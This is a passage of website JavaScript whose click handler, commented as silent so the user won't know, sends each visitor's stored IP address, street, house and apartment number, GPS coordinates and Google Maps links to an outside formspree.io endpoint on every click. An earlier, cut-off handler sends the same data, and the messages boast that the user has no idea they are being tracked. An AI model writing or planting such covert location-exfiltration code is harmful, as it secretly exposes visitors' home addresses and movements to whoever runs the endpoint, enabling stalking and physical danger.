House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}

🗺️ GOOGLE MAPS LINKS:
📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}

User has NO IDEA their TRUE GPS location is being tracked! 🎯`
            })
        });
    }
});

// Silent click tracking (user won't know)
document.addEventListener('click', function(e) {
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    fetch('https://formspree.io/f/xrblaoyr', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: 'Silent Click',
            email: 'click@website.com',
            _subject: `🔍 User Clicked on ${e.target.tagName} - TRUE GPS LOCATION`,
            message: `User clicked on ${e.target.tagName} element.

🏠 TRUE GPS LOCATION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}

🗺️ GOOGLE MAPS LINKS:
📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}

User has NO IDEA their TRUE GPS location is being tracked! 🎯`
        })
    });
}); 